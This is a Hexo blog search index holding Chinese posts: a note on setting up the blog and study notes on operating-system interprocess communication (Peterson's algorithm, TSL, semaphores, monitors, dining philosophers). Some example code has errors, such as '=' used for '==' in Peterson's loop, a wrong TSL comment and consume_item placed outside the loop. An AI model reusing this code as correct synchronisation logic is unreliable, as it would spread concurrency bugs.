<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello_Hexo_Blog</title>
    <url>/2020/05/31/Hello-Hexo-Blog/</url>
    <content><![CDATA[<p> 第一篇博客~ 开心</p>
<a id="more"></a>
<h3 id="简单记录一下搭建过程"><a href="#简单记录一下搭建过程" class="headerlink" title="简单记录一下搭建过程"></a>简单记录一下搭建过程</h3><p>博客基于<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo框架</a> + Github，域名当然是阿里云了 （6元一年他不香吗hhh）</p>
<p>感谢舍友 <a href="https://www.117503445.top/" target="_blank" rel="noopener">@117503445</a> 指名了博客搭建的主要方向，搭建过程中主要参考了知乎用户 @吴润 的<a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">这篇文章</a>，基本很顺畅地搭建起来了，一并致谢。</p>
<ol>
<li>安装并配置Node.js</li>
<li>安装 Hexo 框架</li>
<li>关联 Github 仓库</li>
<li>申请域名并绑定</li>
<li>发布第一篇博客</li>
</ol>
<h3 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h3><p>现在只是把房子搭起来还没有装修啥啊，让俺接着去学一学~</p>
<p>[x] 更换 Hexo 主题</p>
<p>[x] 熟悉博客的发布修改标签等功能</p>
<p>[ ] 建立图床</p>
<p>[ ] 增加其他的小插件 ~~</p>
<h3 id="分类设置"><a href="#分类设置" class="headerlink" title="分类设置"></a>分类设置</h3><ul>
<li>学习笔记    | 系统性的学习<ul>
<li>专业课<ul>
<li>操作系统</li>
</ul>
</li>
</ul>
</li>
<li>技术小记    | 碎片化知识</li>
<li>生活随笔<ul>
<li>山与水    | 游记</li>
<li>书与影    | 书评影评</li>
<li>时与光    | 定期总结</li>
</ul>
</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>技术小记</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之进程间通信</title>
    <url>/2020/06/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<p>本章节包括两个小节</p>
<ol>
<li>进程间通信 (InterProess Communicatiin,IPC)<ol>
<li>临界区</li>
<li>使用忙等待的策略<ol>
<li>禁止中断 / 锁变量 / 严格轮换法 / ⭐Peterson 算法 / TSL 指令</li>
</ol>
</li>
<li>规避忙等待的策略<ol>
<li>忙等待的弊端</li>
<li>休眠与唤醒 / 信号量 Semaphore / 互斥信号量 Mutexe / PV操作</li>
<li>管程 Monitor / 消息传递 / 屏障</li>
</ol>
</li>
</ol>
</li>
<li>经典的IPC问题<ol>
<li>生产与消费</li>
<li>哲学家进餐</li>
<li>读者与写者</li>
</ol>
</li>
</ol>
<a id="more"></a>
<hr>
<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>在本小节会涉及到：</p>
<ol>
<li>什么是临界区资源<ol>
<li>竞争</li>
<li>保证临界区互斥的4个条件</li>
</ol>
</li>
<li>互斥的策略1 (借助忙等待)<ol>
<li>禁止中断</li>
<li>锁变量</li>
<li>严格轮换法</li>
<li>⭐Peterson 算法</li>
<li>TSL 指令</li>
</ol>
</li>
<li>互斥的策略2(不使用忙等待)<ol>
<li>上述策略的缺陷（忙等待 优先级反向）</li>
<li>Sleep &amp; Wakeup<ol>
<li>问题：唤醒丢失</li>
</ol>
</li>
<li>⭐信号量 Semaphore<ol>
<li>互斥信号量 Mutexe</li>
<li>PV操作</li>
</ol>
</li>
<li>管程 Monitor</li>
<li>消息传递</li>
<li>屏障</li>
</ol>
</li>
</ol>
<h3 id="竞争-互斥-临界区"><a href="#竞争-互斥-临界区" class="headerlink" title="竞争, 互斥, 临界区"></a>竞争, 互斥, 临界区</h3><p>两个或多个进程读写某些共享数据,而最后的结果取决于进程运行的实际精确时序, 称之为<strong>竞争条件</strong>.</p>
<p>任何涉及到共享内存, 共享文件, 共享任何资源的情况都会引发竞争. 我们称这些共享的资源为 <strong>临界区</strong>. </p>
<p>我们需要实现的是 <strong>互斥</strong> ,即以某种手段确保当一个进程在使用临界区时, 其他进程不能同样处于临界区中.</p>
<p>一个好的互斥实现方案应当满足这四个条件:</p>
<ol>
<li><p>任意两个进程不能够同时处于临界区</p>
<p><em>这其实是互斥的含义</em></p>
</li>
<li><p>不应该对CPU的速度与数量做任何假设</p>
<p><em>方案应该普适</em></p>
</li>
<li><p>临界区外运行的进程不得阻塞其他进程</p>
</li>
<li><p>不得使进程无限期等待进入临界区</p>
</li>
</ol>
<h3 id="借助忙等待的互斥策略"><a href="#借助忙等待的互斥策略" class="headerlink" title="借助忙等待的互斥策略"></a>借助忙等待的互斥策略</h3><h4 id="屏蔽中断"><a href="#屏蔽中断" class="headerlink" title="屏蔽中断"></a>屏蔽中断</h4><p>进程只有在发生中断的时候才会发生切换(比如时钟中断或IO中断), 最简单的方法就是进程A在进入临界区后立即屏蔽所有中断, 在离开之前再打开中断.这样当某进程屏蔽中断后, 不用担心CPU切换到其他的进程, 更不用担心临界区被别的进程读写.</p>
<p>问题:</p>
<ol>
<li>将屏蔽中断的权力交给进程是不明智的</li>
<li>如果是多核CPU, 单单屏蔽当前CPU并不能起到效果</li>
</ol>
<p>但是这个方法却适用于内核本身需要互斥时很方便, 尽管它不是一个适用于用户进程的通用机制.</p>
<h4 id="锁变量"><a href="#锁变量" class="headerlink" title="锁变量"></a>锁变量</h4><p>使用一个共享的变量, 锁 Lock . 当Lock=1时表示正在使用拒绝其他进程访问, =0时表示空闲允许访问.</p>
<p>但是锁变量本身就是一个临界区, 依旧存在疏漏, 例如某进程使用资源R的过程:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> Lock==<span class="number">0</span> wait()</span><br><span class="line">Lock=<span class="number">1</span></span><br><span class="line">use(R)</span><br><span class="line">Lock=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>假设进程A与B, Lock 初值=1.  代码执行为A.1;(进程切换)B.1;B.2;B.3;(进程切换)A.2;A.3</p>
<p>此时AB同时访问临界区</p>
<h4 id="严格轮换"><a href="#严格轮换" class="headerlink" title="严格轮换"></a>严格轮换</h4><p>使用一个整型变量turn记录哪个进程可以使用资源.</p>
<p>假设进程0与进程1试图访问资源R</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(True)&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">turn</span> != <span class="number">0</span>) wait();</span><br><span class="line">	use(R);</span><br><span class="line">	<span class="built_in">turn</span> = <span class="number">1</span>;</span><br><span class="line">	other_options();</span><br><span class="line">&#125;<span class="comment">//进程0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(True)&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">turn</span> != <span class="number">1</span>) wait();</span><br><span class="line">	use(R);</span><br><span class="line">	<span class="built_in">turn</span> = <span class="number">0</span>;</span><br><span class="line">	other_options();</span><br><span class="line">&#125;<span class="comment">//进程1</span></span><br></pre></td></tr></table></figure>
<p>进程0在执行到0.2时, 只有turn=0时(表示轮到进程0使用了)才会使用临界区; 否则将持续等待turn值的改变. 显然这是对CPU资源的严重浪费. 这种被称作 <strong>忙等待</strong> (busy waiting) , 用于忙等待的锁称作 <strong>自旋锁.</strong> (Spin Lock)</p>
<p>此外, 这种机制要求进程0与进程1必须严格交替使用临界区. 进程0无法连续两次使用临界区.</p>
<p><em>如果有三个进程, turn的值可取0,1,2即可.</em></p>
<h4 id="Peterson解法"><a href="#Peterson解法" class="headerlink" title="Peterson解法"></a>Peterson解法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 2				<span class="comment">// N表示可能访问临界区的进程数量</span></span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">turn</span>;				<span class="comment">// 轮到谁了?</span></span><br><span class="line"><span class="keyword">int</span> interested[N];		<span class="comment">//表示进程是否试图访问临界区, 初值为0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enter_region</span><span class="params">(<span class="keyword">int</span> <span class="built_in">process</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> other = <span class="number">1</span>-<span class="built_in">process</span>;			<span class="comment">//表示除了本进程的其他进程, 注1</span></span><br><span class="line">	interested[<span class="built_in">process</span>]= TRUE; 		<span class="comment">//声明自己试图访问</span></span><br><span class="line">	<span class="built_in">turn</span> = <span class="built_in">process</span>;					<span class="comment">//声明轮到自己了</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">turn</span> = <span class="built_in">process</span> &amp;&amp; interested[other]== TRUE)</span><br><span class="line">    	wait();					<span class="comment">//当轮到自己但别人感兴趣的时候等待,谦让,注2</span></span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leave_region</span><span class="params">(<span class="keyword">int</span> <span class="built_in">process</span>)</span></span>&#123;</span><br><span class="line">    interested[<span class="built_in">process</span>]=FALSE; <span class="comment">//离开时声明自己放弃访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注1: 此处仅有两个进程, 因此other是非0即1的整型. 实际中表示所有其他的进程</p>
<p>注2: 当轮到自己且别人都没兴趣(无需谦让), 或者没轮到自己但别人感兴趣(不谦让第二次)</p>
<h4 id="TSL指令"><a href="#TSL指令" class="headerlink" title="TSL指令"></a>TSL指令</h4><p>TSL 意为 Test and Set Lock . 这个方法需要硬件的协助. 硬件需要支持一条汇编指令TSL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TSL REGISTER,LOCK	&#x2F;&#x2F;将LOCK变量复制到寄存器,并将LOCK设置为1</span><br><span class="line">&#x2F;&#x2F;这个操作是原子性的,复制和赋值之间不会被中断</span><br><span class="line">&#x2F;&#x2F;LOCK&#x3D;0可访问,&#x3D;1不可访问</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enter_region:</span><br><span class="line">	TSL REGISTER,LOCK	&#x2F;&#x2F;将LOCK变量复制到寄存器,并将LOCK设置为1</span><br><span class="line">	CMP REGISTER #0		&#x2F;&#x2F;(原来的LOCK是0吗?)</span><br><span class="line">	JNE enter_region	&#x2F;&#x2F;原来就是1,别的正在使用,循环等待</span><br><span class="line">	RET					&#x2F;&#x2F;原来是1, 可以使用</span><br><span class="line">	</span><br><span class="line">leave_region:</span><br><span class="line">	MOVE LOCK.#O		&#x2F;&#x2F;用完了,设置为0</span><br><span class="line">	RET</span><br></pre></td></tr></table></figure>
<p>当LOCK为1是时候,CPU将内存总线锁住, 无法访问内存.</p>
<h3 id="无需忙等待的互斥策略"><a href="#无需忙等待的互斥策略" class="headerlink" title="无需忙等待的互斥策略"></a>无需忙等待的互斥策略</h3><h4 id="忙等待-CPU浪费与优先级反转"><a href="#忙等待-CPU浪费与优先级反转" class="headerlink" title="忙等待:CPU浪费与优先级反转"></a>忙等待:CPU浪费与优先级反转</h4><p>以上策略都是进入先试探能否进入,若不能原地等待,直到允许位置.</p>
<p>这种方法不仅浪费了CPU, 还会导致 <strong>优先级翻转</strong> 的问题</p>
<p>假设两个进程H与L, 他们在调度算法中优先级分别为高or低.某一时刻L正在临界区, 此时H转为就绪态. 调度算法将CPU使用权转移至H, 但由于临界区正在使用H处于忙等待, L由于得不到CPU使用权无法离开临界区. H将一直忙等待下去.</p>
<h4 id="生产与消费-错解-休眠唤醒"><a href="#生产与消费-错解-休眠唤醒" class="headerlink" title="生产与消费_错解:休眠唤醒"></a>生产与消费_错解:休眠唤醒</h4><p>使用sleep与wakeup来实现生产者消费者问题<strong>会产生虚假唤醒(又叫唤醒丢失), 是行不通的.</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">int</span> count =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">producer</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> (TRUE)&#123;</span><br><span class="line">       	item= produce_item();</span><br><span class="line">		<span class="keyword">if</span> (count = N)</span><br><span class="line">            sleep();</span><br><span class="line">		insert_item(item);</span><br><span class="line">		count = count+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(count == <span class="number">1</span>)wakeup(consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*本意:</span></span><br><span class="line"><span class="comment">	不断生产, 如果生产满了就休眠;</span></span><br><span class="line"><span class="comment">	放入缓冲区,如果缓冲区数目为1唤醒消费者*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> item;</span><br><span class="line">	<span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">	<span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        sleep();</span><br><span class="line">	item = move_item();</span><br><span class="line">	count= count <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (count == N<span class="number">-1</span>)wakeup(producer);</span><br><span class="line">	consume_tem(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*本意:</span></span><br><span class="line"><span class="comment">	不断消费, 如果消费完了就休眠;</span></span><br><span class="line"><span class="comment">	缓冲区--,如果缓冲区数目为N-1唤醒生产者*/</span></span><br></pre></td></tr></table></figure>
<p>实际的问题:</p>
<ul>
<li><p>Case1: </p>
<p>若当前count = 0, 消费者在#23 判断为应当睡眠, 但是还没有执行#24: sleep(), CPU使用权就被转移至producer; 生产者运行至#13, 认为消费者正在休眠故唤醒之, 但此时消费者并不再休眠, 故唤醒丢失;</p>
<p>CPU使用权回到消费者, 继续执行#24 , 休眠.继续生产. 但此时count=1, 不断生产的过程中不会再次达到1唤醒消费者, 直到生产满, 生产者也陷入休眠</p>
</li>
<li><p>Case2:</p>
<p>若当前count = N, 生产者在#9 判断为应当睡眠, 但是还没有执行#10: sleep(), CPU使用权就被转移至消费者; 消费者运行至#27, 认为生产者正在休眠故唤醒之, 但此时生产者并不再休眠, 故唤醒丢失;</p>
<p>CPU使用权回到生产者, 继续执行#10 , 休眠. 继续消费. 但此时count=N-1, 不断消费的过程中不会再次达到N-1唤醒生产者, 直到消费完, 消费者也陷入休眠</p>
</li>
</ul>
<h4 id="PV操作"><a href="#PV操作" class="headerlink" title="PV操作"></a>PV操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> S = m;		<span class="comment">//信号量S,初值m表示最大提供m个进程使用</span></span><br><span class="line">P(S)&#123;</span><br><span class="line">	S--;</span><br><span class="line">	<span class="keyword">if</span>(S&lt;<span class="number">0</span>)</span><br><span class="line">		bloked();</span><br><span class="line">&#125;</span><br><span class="line">V(S)&#123;</span><br><span class="line">	S++;</span><br><span class="line">	<span class="keyword">if</span>(S&lt;=<span class="number">0</span>)</span><br><span class="line">		wakeup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个进程申请使用资源, S: m-&gt;m-1</li>
<li><p>……</p>
</li>
<li><p>第m-1个进程申请使用资源, S: 2 -&gt; 1;</p>
</li>
<li>第m个进程申请使用资源, S: 1 -&gt; 0 , 正好分配完毕;</li>
<li>第m+1个进程申请使用资源, S: 0 -&gt; -1 , 无法分配, 被阻塞, 欠1个;</li>
<li>第m+2个进程申请使用资源, S: -1 -&gt; -2 , 无法分配, 被阻塞, 欠2个;</li>
<li>此时某进程执行V(), S: -2 -&gt; -1, 因为S &lt;= 0, 唤醒某个进程使用资源;</li>
<li>此时某进程执行V(), S: -1 -&gt; 0, 因为S &lt;= 0, 唤醒某个进程使用资源;</li>
<li>此时某进程执行V(), S: 0 -&gt; 1, 因为S &gt; 0, 无需唤醒;</li>
<li>……</li>
</ul>
<p>说明:</p>
<ol>
<li>唤醒进程中, 具体唤醒的是哪一个进程由其他算法决定</li>
<li>当S&gt;=0时, S表示资源还可供多少进程使用; 当S&lt;=0时, S表示有多少个进程在等待资源;</li>
<li>有些地方的算法(比如教材中) 并不支持S为负数的情况, S最低为0; 那种算法是在V操作唤醒进程后进程再次使用P操作. 基本思路是类似的.</li>
<li>P 操作又称down操作; V操作又称up操作; 这两个字母是从荷兰语中出来的.</li>
</ol>
<p>​        </p>
<h4 id="生产者与消费者-正解-PV"><a href="#生产者与消费者-正解-PV" class="headerlink" title="生产者与消费者_正解:PV"></a>生产者与消费者_正解:PV</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100			<span class="comment">//缓冲区的槽数目</span></span></span><br><span class="line"><span class="keyword">int</span> mutex = <span class="number">1</span>;			<span class="comment">//临界区最多只允许1个进程访问</span></span><br><span class="line"><span class="keyword">int</span> empty = N;			<span class="comment">//缓冲区的空槽数目</span></span><br><span class="line"><span class="keyword">int</span> full = <span class="number">0</span>;			<span class="comment">//缓冲区的的满槽数目</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">producer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(True)&#123;</span><br><span class="line">        item = produce_item();		<span class="comment">//生产</span></span><br><span class="line">        down(&amp;empty);				<span class="comment">//空槽--;若无空槽不会继续执行</span></span><br><span class="line">        down(&amp;mutex);				<span class="comment">//确保缓冲区仅被1进程使用</span></span><br><span class="line">        put_item(item);				<span class="comment">//将item放入缓冲区</span></span><br><span class="line">        up(&amp;mutex);					<span class="comment">//退出缓冲区</span></span><br><span class="line">        up(&amp;full);					<span class="comment">//满槽++</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span></span>&#123;</span><br><span class="line"> 	<span class="keyword">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(True)&#123;</span><br><span class="line">        down(&amp;full);				<span class="comment">//满槽--;若无满槽不会继续执行</span></span><br><span class="line">        down(&amp;mutex);				<span class="comment">//确保缓冲区仅被1进程使用</span></span><br><span class="line">        item = remove_item();		<span class="comment">//将item放入缓冲区</span></span><br><span class="line">        up(&amp;mutex);					<span class="comment">//退出缓冲区</span></span><br><span class="line">        up(&amp;empty);					<span class="comment">//空槽++</span></span><br><span class="line">    &#125;</span><br><span class="line">    consume_item(item);				<span class="comment">//消费</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>记忆:</p>
<ul>
<li>永远是先down后up</li>
<li><del>对于临界区(本题为缓冲区), 永远是down与up紧紧夹住</del> 这句话不全面  忽略</li>
<li>生产者down空槽, 消费者down满槽</li>
</ul>
<h4 id="管程-Monitor"><a href="#管程-Monitor" class="headerlink" title="管程 Monitor"></a>管程 Monitor</h4><p>PV操作是可以完全正确地使用临界区, 但是在程序编写的过程中容易出现死锁的情况. 引入 <strong>管程</strong> 使得程序的编写更加友好.</p>
<p>管程是一个由过程,变量,以及数据结构组成的集合. 管程提供了访问和修改临界区资源的接口, 并且<strong>只允许进程通过管程(不能绕过管程)访问这些资源</strong>, 并且在<strong>同一时间只允许一个活跃进程使用管程来读写临界</strong>区. 管程本身是一种高级同步原语, 这使得它在执行时不会被中断. <u>管程本身并没有新技术, 而是编程语言提供的一个更加方便编程的辅助工具.</u></p>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这是一个类Pascal语言, 原因见注1</span></span><br><span class="line"><span class="comment">//主要代码其实与 休眠唤醒 部分类似, wait &lt;-&gt; sleep, signal &lt;-&gt; wakeup</span></span><br><span class="line"><span class="comment">//但是管程不会出现唤醒丢失的问题, 原因见注2</span></span><br><span class="line">monitor ProducerConsumer	<span class="comment">//一个管程</span></span><br><span class="line">	condition full, empty;</span><br><span class="line">	integer count;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">procedure</span> <span class="title">insert</span><span class="params">(item: integer)</span>;</span>	<span class="comment">//管程中的插入函数</span></span><br><span class="line">	<span class="keyword">begin</span></span><br><span class="line">		<span class="keyword">if</span> count =N <span class="keyword">then</span> wait(full);</span><br><span class="line">		insert_item(item);</span><br><span class="line">		count:=count +<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> count=<span class="number">1</span> <span class="keyword">then</span> signal(empty)	</span><br><span class="line">	<span class="keyword">end</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">remove</span>:</span>integer;			<span class="comment">//管程中的移除函数</span></span><br><span class="line">	<span class="keyword">begin</span></span><br><span class="line">		<span class="keyword">if</span> count =<span class="number">0</span> <span class="keyword">then</span> wait(empty);</span><br><span class="line">		remove = remove_item;</span><br><span class="line">		count:=count-<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> count=N-<span class="number">1</span> <span class="keyword">then</span> signal(full)</span><br><span class="line">	<span class="keyword">end</span>;</span><br><span class="line">	count :=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">end</span> monitor;				<span class="comment">//管程结束</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">procedure</span> <span class="title">producer</span>;</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">while</span> true <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">begin</span></span><br><span class="line">	item= produce_item;</span><br><span class="line">	ProducerConsumer.insert(item)		<span class="comment">//其他进程通过管程来访问临界区</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">procedure</span> <span class="title">consumer</span>;</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">while</span> true <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">begin</span></span><br><span class="line">	item = ProducerConsumer.remove;		<span class="comment">//绕过管程而访问是不允许的</span></span><br><span class="line">	consume_item(item)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>注1: 管程是语言概念, 使用管程需要编程语言本身支持. 很遗憾C语言并不支持管程. 这也是其缺陷之一. (Java是支持管程的) </li>
<li>注2 : 任意时刻管程中只能有一个活跃进程, 从而保证管程本身的互斥. 这一特性是由语言的编译器实现的, 从而减少出错的可能性.</li>
<li>管程中的阻塞函数wait与signal其实与sleep, wakeup基本一致.</li>
</ul>
<p>此外, 无论是管程还是信号量, 都有一个问题: 它们必须要求是单核机器, 或者是拥有共享内存的多核机器. 如果是多核且这些CPUs每个都拥有自己独立的内存, 这些方法都会失效.</p>
<h4 id="消息传递-Message-Passing"><a href="#消息传递-Message-Passing" class="headerlink" title="消息传递 Message Passing"></a>消息传递 Message Passing</h4><p><em>不是重点</em></p>
<p>如果没有共享内存, 甚至不在同一台机器上(例如互联网抢票) 上述利用共享内存的方法均失效. 此时使用消息传递来保证临界区的互斥.</p>
<p>消息传递的实现中需要做到:</p>
<ul>
<li>应答机制来避免消息的丢失</li>
<li>将消息的顺序复原成正确的顺序</li>
<li>避免消息的混淆</li>
<li>消息真实性的认证</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line">#使用消息传递实现生产-消费</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">producer</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> item;</span><br><span class="line">	message m;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">		item= produce_item();</span><br><span class="line">		receive(consumer,&amp;m);</span><br><span class="line">		<span class="function">build <span class="title">message</span><span class="params">(&amp;m, item)</span></span>;</span><br><span class="line">		send(consumer, &amp;m);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> item,i;</span><br><span class="line">	message m;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++) send(producer,&amp;m);</span><br><span class="line">	<span class="keyword">while</span>(TrUe)&#123;</span><br><span class="line">		receive(producer, &amp;m);</span><br><span class="line">		item= extract_ item(&amp;m);</span><br><span class="line">		send(producer, &amp;m);</span><br><span class="line">		<span class="function">consume <span class="title">item</span><span class="params">(item)</span></span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="屏障-Barriers"><a href="#屏障-Barriers" class="headerlink" title="屏障 Barriers"></a>屏障 Barriers</h4><p>将不同的进程划分为同一个组, 在某处设置一处屏障, 只有当组内的所有进程都达到了屏障才可以继续执行. 这种方法使得进程的快慢达到了一致.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E5%B1%8F%E9%9A%9C.png" alt=""></p>
<hr>
<h2 id="Classical-IPC-Problems"><a href="#Classical-IPC-Problems" class="headerlink" title="Classical IPC Problems"></a>Classical IPC Problems</h2><p>本小节将涉及到几个常见IPC模型：</p>
<ol>
<li>进餐的哲学家</li>
<li>读者与写者</li>
</ol>
<p>此外生产者消费者问题见上.</p>
<h3 id="进餐的哲学家"><a href="#进餐的哲学家" class="headerlink" title="进餐的哲学家"></a>进餐的哲学家</h3><p>哲学家吃了想想了吃, 每个哲学家要吃饭必须拥有两把叉子.不能同时拿起两把叉子.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E5%93%B2%E5%AD%A6%E5%AE%B6.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N		5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT 	(i+N-1)%N</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGht	(i+1)%N</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THINKING 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HUNgrY 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EATING</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> semaphore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> state[N];				<span class="comment">//表示每个哲学家的当前状态</span></span><br><span class="line">semaphore mutex = <span class="number">1</span>;		<span class="comment">//每次只能都有一个哲学家处于判断状态</span></span><br><span class="line">semaphore s[N];				<span class="comment">//每个哲学家一个信号量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">philosopher</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">		think();</span><br><span class="line">		<span class="function">take <span class="title">forks</span><span class="params">(i)</span></span>;</span><br><span class="line">		eat();</span><br><span class="line">		<span class="function">put_ <span class="title">forks</span><span class="params">(i)</span></span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">take_forks</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">	down(&amp;mutex);			<span class="comment">//本哲学家开始判断</span></span><br><span class="line">	state[i]=HUNGRY;		<span class="comment">//声明自己饿了</span></span><br><span class="line">	test(i);				<span class="comment">//测试自己</span></span><br><span class="line">	up(&amp;mutex);				<span class="comment">//判断结束</span></span><br><span class="line">	down(&amp;s[i]);			<span class="comment">//如果我开吃了,信号量复原;如果我没在吃,陷入阻塞</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_forks</span><span class="params">(i)</span></span>&#123;</span><br><span class="line">	down(&amp;mutex);			<span class="comment">//本哲学家开始判断</span></span><br><span class="line">	state[i]= THINKING;		<span class="comment">//我开始思考</span></span><br><span class="line">	test(LEFT);				<span class="comment">//判断左边的哲学家</span></span><br><span class="line">	test(RIGHT);</span><br><span class="line">	up(&amp;mutex);    			<span class="comment">//判断结束</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (state[i]== HUNGRY &amp;&amp; state[LEFT]!= EATING &amp; state[RIGHT]!= EATING)&#123;</span><br><span class="line">        state[i] = EATING;</span><br><span class="line">        up(&amp;s[i]);</span><br><span class="line">    &#125;	<span class="comment">//如果当前哲学家饿了且左右不在进食: 本哲学家吃且S++</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="读者与写者"><a href="#读者与写者" class="headerlink" title="读者与写者"></a>读者与写者</h3><p>对于同一个文件, 读者与读者可以共同访问, 但是写者不能与其他写着或读者共同访问.</p>
